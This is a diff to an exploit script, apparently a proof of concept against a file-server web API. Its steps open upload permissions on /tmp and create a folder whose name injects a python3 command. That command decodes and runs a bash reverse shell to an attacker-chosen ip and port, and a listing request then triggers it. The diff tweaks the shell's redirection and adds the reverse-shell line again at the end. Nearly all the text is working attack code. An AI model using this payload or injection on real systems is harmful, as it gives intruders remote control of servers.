@@ -508,7 +508,7 @@ print("Step 2 set permission vfs")
 step2 = req.post(url+"~/api/set_vfs", headers=headers, json={"uri":"/tmp/","props":{"can_see":None,"can_read":None,"can_list":None,"can_upload":"*","can_delete":None,"can_archive":None,"source":"/tmp","name":"tmp","type":"folder","masks":None}})
 
 print("Step 3 create folder")
-command = "bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} 0>&1'".format(ip,port)
+command = "bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} <&1'".format(ip,port)
 command = command.encode('utf-8')
 payload = 'poc";python3 -c "import os;import base64;os.system(base64.b64decode(\''+base64.b64encode(command).decode('utf-8')+"'))"
 step3 = req.post(url+"~/api/create_folder", headers=headers, json={"uri":"/tmp/","name":payload})
@@ -517,3 +517,4 @@ print("Step 4 execute payload")
 step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 ```
 
+"bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} <&1'"
